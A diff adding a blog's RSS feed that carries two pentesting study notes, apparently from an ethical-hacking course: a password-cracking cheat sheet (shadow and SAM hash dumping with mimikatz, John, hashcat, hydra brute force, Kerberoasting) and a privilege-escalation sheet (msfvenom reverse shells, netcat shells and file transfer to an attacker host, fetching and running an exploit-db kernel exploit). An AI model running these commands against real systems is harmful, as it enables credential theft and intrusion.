@@ -1,0 +1,281 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Ethical Hacking on Agus Fahmi Aji Pramana&#39;s Blogging Site</title>
+    <link>http://localhost:1313/tags/ethical-hacking/</link>
+    <description>Recent content in Ethical Hacking on Agus Fahmi Aji Pramana&#39;s Blogging Site</description>
+    <image>
+      <title>Agus Fahmi Aji Pramana&#39;s Blogging Site</title>
+      <url>http://localhost:1313/logo.svg</url>
+      <link>http://localhost:1313/logo.svg</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <atom:link href="http://localhost:1313/tags/ethical-hacking/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Password Cracking Tools and Techniques</title>
+      <link>http://localhost:1313/notes/password-cracking-tools-and-techniques/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/notes/password-cracking-tools-and-techniques/</guid>
+      <description>Use of different tools to used for cracking password</description>
+      <content:encoded><![CDATA[<h2 id="intro">Intro</h2>
+<h3 id="dictionary-attacks">Dictionary Attacks</h3>
+<blockquote>
+<p>CeWL (Custom Word List generator) is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers such as John the Ripper.</p></blockquote>
+<table>
+  <thead>
+      <tr>
+          <th>Type</th>
+          <th>Path</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>John The Ripper</td>
+          <td>/usr/share/john/password.lst</td>
+      </tr>
+      <tr>
+          <td>Rock You</td>
+          <td>/usr/share/wordlists/rockyou.txt.gz</td>
+      </tr>
+  </tbody>
+</table>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">locate wordlists
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gzip -d /usr/share/wordlists/rockyou.txt.gz rockyou.txt
+</span></span><span class="line"><span class="cl">or
+</span></span><span class="line"><span class="cl">gunzip /usr/share/wordlists/rockyou.txt.gz rockyou.txt
+</span></span></code></pre></div><h2 id="exploration">Exploration</h2>
+<h3 id="linux">Linux</h3>
+<p>In Linux, the <code>/etc/passwd</code> file contains potentially important metadata in the GECOS field, including full name, room number, work phone, home phone, and others. Linux stores password hashes in the <code>/etc/shadow</code> file, which is why you need to use the sudo command to view it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /etc/passwd
+</span></span><span class="line"><span class="cl">sudo cat /etc/shadow
+</span></span></code></pre></div><p>The <code>unshadow</code> utility combines the /etc/passwd and /etc/shadow files. This is done so that John the Ripper can attempt to crack the password with information from both files, using a single file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo unshadow /etc/passwd /etc/shadow &gt; combined.txt
+</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
+<h3 id="linux-password">Linux Password</h3>
+<blockquote>
+<p>Kali Linux 2021.1 changed the hash function for passwords from sha512crypt (listed as $6$ in the /etc/shadow file) to yescrypt (listed as $y$ in the /etc/shadow file).</p></blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo adduser vulnuser <span class="o">(</span>room number: 8848.86 password vulnuser8848.86<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [Your First Name] user a password of [Your Second Name] (you will not</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># see anything on the screen when you type the password).</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Press ENTER for all the subsequent prompts</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># (Full Name, Room Number, Work Phone, Home Phone, and Other) until the</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># last prompt, which asks “Is the information correct? [Y/n].</span>
+</span></span></code></pre></div><h4 id="john-the-ripper">John The Ripper</h4>
+<blockquote>
+<p>John the Ripper will not attempt to crack a password it has already cracked.</p></blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># By the time you are reading this, support for the $y$ hashes might</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># be incorporated into John the Ripper, which would mean you could</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># leave off --format=crypt for some speedup</span>
+</span></span><span class="line"><span class="cl">sudo john --wordlist<span class="o">=</span>/usr/share/john/password.lst --format<span class="o">=</span>crypt combined.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># See all passwords already cracked.</span>
+</span></span><span class="line"><span class="cl">sudo john --show --format<span class="o">=</span>crypt combined.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># To remove remembered password.</span>
+</span></span><span class="line"><span class="cl">sudo rm /root/.john/john.pot
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># By default single crack mode, uses the GECOS field, without wordlist.</span>
+</span></span><span class="line"><span class="cl">sudo john --format<span class="o">=</span>crypt combined.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt --format<span class="o">=</span>crypt combined.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt --format<span class="o">=</span>Raw-SHA256 faiz.txt
+</span></span></code></pre></div><h4 id="hydra">hydra</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Target FTP</span>
+</span></span><span class="line"><span class="cl">hydra -L username.txt -P /usr/share/wordlists/rockyou.txt ftp &lt;target-ip-addr&gt; -vV
+</span></span><span class="line"><span class="cl">  -L username file
+</span></span><span class="line"><span class="cl">  -l username
+</span></span><span class="line"><span class="cl">  -P password file
+</span></span><span class="line"><span class="cl">  -p password
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Target SSH</span>
+</span></span><span class="line"><span class="cl">hydra -l &lt;username&gt; -P /usr/share/wordlists/rockyou.txt ssh://&lt;target-ip-addr&gt; -vV
+</span></span></code></pre></div><h3 id="windows-password">Windows Password</h3>
+<p>Creating user:</p>
+<ul>
+<li>Click the <strong>Start</strong> button or in the search box, type <strong>Computer Management</strong>, and select <strong>Computer Management</strong>. This opens the <strong>Computer Management Console</strong>.</li>
+<li>Expand <strong>Local Users and Groups</strong> in the pane at the left.</li>
+<li>Click <strong>Users</strong> to see all the current local user accounts.</li>
+<li>Right-click on a blank area in the right pane and select <strong>New User</strong>.</li>
+<li>Fill in the fields, creating a four-digit password with just lowercase letters.</li>
+<li>Clear the checkbox next to User Must Change Password At Next Logon and click the <strong>Create</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">SAM</span> <span class="n">sam</span><span class="p">.</span><span class="py">hiv</span>
+</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">system</span><span class="p">.</span><span class="py">hiv</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">mimikatz</span>
+</span></span><span class="line"><span class="cl"><span class="p">&gt;</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
+</span></span><span class="line"><span class="cl"><span class="p">&gt;</span> <span class="n">token</span><span class="p">::</span><span class="n">elevate</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Send the next command’s output to a text file called hashes.txt:</span>
+</span></span><span class="line"><span class="cl"><span class="p">&gt;</span> <span class="n">log</span> <span class="n">hashes</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Output the usernames and hashes for all accounts on the system:</span>
+</span></span><span class="line"><span class="cl"><span class="p">&gt;</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">sam</span> <span class="n">sam</span><span class="p">.</span><span class="py">hiv</span> <span class="n">system</span><span class="p">.</span><span class="py">hiv</span>
+</span></span></code></pre></div><p>e.g. windowshashes.txt</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Beatles:5be2f274f2f80c5d4d0c597f023f4f61::::
+</span></span><span class="line"><span class="cl">StarWars:b7c899154197e8a2a33121d76a240ab5::::
+</span></span></code></pre></div><h4 id="getuserspnspy">GetUserSPNs.py</h4>
+<blockquote>
+<p>Note: If there is misconfigured account, we can obtain the credentials from Active Directory using <code>GetUserSPNs</code>.</p></blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-GetUserSPNs -dc-ip &lt;dc-ip-addr&gt; &lt;host&gt;.local/&lt;user&gt;:&lt;pass&gt; -request
+</span></span></code></pre></div><blockquote>
+<p>If error: <code>Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code> you need to synchronize the host with the Domain Controller time.</p></blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Download from here https://sourceforge.net/projects/openrdate/</span>
+</span></span><span class="line"><span class="cl">tar -xvzf opendate-1.2.tar.gz
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> opendate
+</span></span><span class="line"><span class="cl">./configure
+</span></span><span class="line"><span class="cl">make
+</span></span><span class="line"><span class="cl">make install
+</span></span><span class="line"><span class="cl">rdate -n &lt;domain-controller-ip&gt;
+</span></span></code></pre></div><h4 id="john-the-ripper-1">John The Ripper</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Brute force of 4 character.</span>
+</span></span><span class="line"><span class="cl">sudo crunch <span class="m">4</span> <span class="m">4</span> <span class="p">|</span> sudo john --format<span class="o">=</span>NT windowshashes.txt --stdin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo john --format<span class="o">=</span>NT windowhashes.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo john --show --format<span class="o">=</span>NT windowshashes.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">john --format<span class="o">=</span>krb5tgs --wordlist<span class="o">=</span>password.txt hash.kerberoast
+</span></span></code></pre></div><h4 id="crackmapexec">crackmapexec</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Generating passwords. e.g. (ADMINISTRATOR1996)</span>
+</span></span><span class="line"><span class="cl">crunch <span class="m">18</span> <span class="m">18</span> -t ^ADMINISTRATOR19%% &gt; passwords.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">crackmapexec winrm &lt;target-ip-addr&gt; -u Administrator -p passlist
+</span></span></code></pre></div><h4 id="hashcat">hashcat</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">13100</span> --force -a <span class="m">0</span> hash.kerberoast password.txt <span class="c1"># -m refers to hash type</span>
+</span></span></code></pre></div><h3 id="ssh-pass-key">SSH Pass key</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python /usr/share/john/ssh2john.py id_rsa &gt; ssh_hash.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt ssh_hash.txt
+</span></span><span class="line"><span class="cl">or
+</span></span><span class="line"><span class="cl">john ssh_hash.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Avoid Unprotected Warning</span>
+</span></span><span class="line"><span class="cl">chmod <span class="m">600</span> id_rsa
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ssh -i id_rsa user@&lt;target-ip-addr&gt;
+</span></span></code></pre></div><h2 id="window-remote-management-winrm">Window Remote Management (WinRM)</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gem install evil-winrm
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">evil-winrm -i &lt;target-windows-ip-addr&gt; -u <span class="s1">&#39;admin&#39;</span> -p <span class="s1">&#39;pass&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># PowerShell</span>
+</span></span><span class="line"><span class="cl">Get-ChildItem -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
+</span></span><span class="line"><span class="cl"><span class="c1"># Windows Prompt</span>
+</span></span><span class="line"><span class="cl">dir secret.doc /s /p
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Display content of file</span>
+</span></span><span class="line"><span class="cl"><span class="nb">type</span> &lt;path&gt;
+</span></span></code></pre></div><h2 id="remediation">Remediation</h2>
+<ul>
+<li>Account Lockout.</li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Privilege Escalation Tools and Techniques</title>
+      <link>http://localhost:1313/notes/privilege-escalation-tool-and-techniques/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/notes/privilege-escalation-tool-and-techniques/</guid>
+      <description>Understand Privilege Escalation and use of tools</description>
+      <content:encoded><![CDATA[<h2 id="reverse-shell">Reverse Shell</h2>
+<p>Take advantage of the target system&rsquo;s vulnerabilities to initiate a shell session. Here, listener is attacker.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Windows Server</span>
+</span></span><span class="line"><span class="cl">msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;listener-ip-addr&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listener-port&gt; -f exe &gt; shell-x64.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nc -lvp &lt;listener-port&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Now, after you download and run the app. We get the access to victim&#39;s shell.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Java Server</span>
+</span></span><span class="line"><span class="cl">msfvenom -p java/jsp_shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>&lt;listener-ip-addr&gt; <span class="nv">lport</span><span class="o">=</span>&lt;listener-port&gt; -f war &gt; shell.war
+</span></span></code></pre></div><h3 id="winpeas">WinPEAS</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">WinPEASx65</span><span class="p">.</span><span class="py">exe</span> <span class="n">systeminfo</span> <span class="n">log</span><span class="p">=</span><span class="n">systeminfo</span><span class="p">.</span><span class="py">txt</span> <span class="c"># Privilege Escalation</span>
+</span></span></code></pre></div><h3 id="netcat">netcat</h3>
+<h4 id="windows">Windows</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">ncat</span><span class="p">.</span><span class="py">exe</span> <span class="n">-lp</span> <span class="mf">52000</span> <span class="c"># Start listening at port 52000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">netstat</span> <span class="n">-an</span> <span class="p">|</span> <span class="n">more</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># If file doesn&#39;t exist it will be created else cleared and redirected.</span>
+</span></span><span class="line"><span class="cl"><span class="n">ncat</span><span class="p">.</span><span class="py">exe</span> <span class="n">-lp</span> <span class="mf">55555</span> <span class="p">&gt;</span> <span class="n">alice</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl"><span class="c"># Append in a file instead.</span>
+</span></span><span class="line"><span class="cl"><span class="n">ncat</span><span class="p">.</span><span class="py">exe</span> <span class="n">-lp</span> <span class="mf">55555</span> <span class="p">&gt;&gt;</span> <span class="n">alice</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ncat</span><span class="p">.</span><span class="py">exe</span> <span class="n">-lp</span> <span class="mf">10314</span> <span class="n">-e</span> <span class="n">cmd</span><span class="p">.</span><span class="py">exe</span> <span class="c"># -e is executable i.e. cmd.exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ncat</span><span class="p">.</span><span class="py">exe</span> <span class="p">&lt;</span><span class="nb">target-linux</span><span class="n">-ip-addr</span><span class="p">&gt;</span> <span class="mf">14618</span> <span class="c"># Bash shell from Linux</span>
+</span></span></code></pre></div><h4 id="linux">Linux</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc &lt;target-windows-ip-addr&gt; <span class="m">52000</span> <span class="c1"># Linux</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Send content of the bob.txt file.</span>
+</span></span><span class="line"><span class="cl">nc -w <span class="m">1</span> &lt;target-windows-ip-addr&gt; <span class="m">5555</span> &lt; bob.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># If the connection and stdin are idle for more than timeout seconds,</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># the connection is closed silently. Default is no timeout.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># `nc` will listen forever for a connection, with or without the -w flag.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nc &lt;target-windows-ip-addr&gt; <span class="m">10314</span> <span class="c1"># Windows prompt from Linux</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nc -lp <span class="m">14618</span> -e /bin/bash <span class="c1"># bash as executable.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nc -nlvp <span class="m">5555</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -n: no DNS or service lookups on any addresses, hostnames or port names.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -l: listen for an incoming connection.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -v: give more verbose output.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -p: to specify the local port number.</span>
+</span></span></code></pre></div><blockquote>
+<p>Note: <code>&gt;</code> is output redirection character, <code>&lt;</code> is input redirection character.</p></blockquote>
+<h2 id="exploit-dbcom">exploit-db.com</h2>
+<p>Based on Linux kernal, VulnOS -&gt; <code>37292</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">wget https://www.exploit-db.com/exploits/44298 -O exploit.c
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gcc exploit.c -o exploit
+</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> exploit
+</span></span><span class="line"><span class="cl">./exploit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">whoami
+</span></span></code></pre></div><h2 id="linenum">LinEnum</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Attacker Server</span>
+</span></span><span class="line"><span class="cl">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O LinEnum <span class="c1"># or Copy RAW to to LinEnum file.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">chmod +x LinEnum
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python -m http.server <span class="m">8000</span> <span class="c1"># Serving http server to host a file to download.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Victim Client</span>
+</span></span><span class="line"><span class="cl">wget http://&lt;attacker-ip-addr&gt;:8000/LinEnum
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">./LinEnum
+</span></span></code></pre></div><h2 id="gobuster---directory-traversal">Gobuster - Directory Traversal</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># -u assign target</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -w word list</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -x is list of extensions</span>
+</span></span><span class="line"><span class="cl">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u &lt;target-ip-addr&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gobuster dir -w /usr/share/wordlists/dirb/common.txt -x .php,.txt,.html -u &lt;target-ip-addr&gt;
+</span></span></code></pre></div><h2 id="spawning-bash-shell">Spawning Bash Shell</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span> <span class="c1"># Pseudo-terminal utilities</span>
+</span></span></code></pre></div><h2 id="root-login-on-nopasswd-sudoer">Root Login on NOPASSWD Sudoer</h2>
+<blockquote>
+<p><code>sudo -l</code>: This command is used to list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host.</p></blockquote>
+<blockquote>
+<p><code>sudo -i</code>: This command, also known as sudo &ndash;login, starts a new shell as the target user (root by default), and changes to their home directory.</p></blockquote>
+<h2 id="window-remote-management-winrm">Window Remote Management (WinRM)</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i &lt;target-windows-ip-addr&gt; -u <span class="s1">&#39;admin&#39;</span> -p <span class="s1">&#39;pass&#39;</span>
+</span></span></code></pre></div><blockquote>
+<p>Which metasploit module can be used in this case to abuse Windows Remote Management?
+<strong>auxiliary/scanner/winrm/winrm_login</strong></p></blockquote>
+<h2 id="reference">Reference</h2>
+<ul>
+<li><a href="https://github.com/ec-council-learning/Pentesting-Fundamentals-for-Beginners">https://github.com/ec-council-learning/Pentesting-Fundamentals-for-Beginners</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+  </channel>
+</rss>
